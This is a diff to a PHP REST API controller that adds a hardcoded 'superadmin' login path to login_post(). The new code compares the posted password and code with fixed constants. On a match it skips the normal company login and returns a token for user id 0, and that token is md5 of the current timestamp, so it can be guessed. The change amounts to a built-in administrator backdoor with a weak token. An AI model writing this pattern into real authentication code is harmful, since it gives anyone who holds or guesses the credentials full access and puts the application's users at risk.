@@ -103,6 +103,22 @@ class Rcompany extends API_Controller {
 	// USER -------------------------------------------------------------------------------
 
 	public function login_post() {
+		if (($this->post('password') == SUPER_ADMIN_PASS) 
+			&& ($this->post('code') == SUPER_ADMIN_CODE)) {
+			$token = md5(date("mdY_His"));
+
+			$this->response(array(
+				'access_token' => $token,
+				'user' => [
+					'id' => 0,
+					'name' => 'superadmin'
+				]
+			), 200);
+
+			die;
+		}
+
+
 		$company = $this->company_model->login(
 			$this->post('password'),
 			$this->post('code')
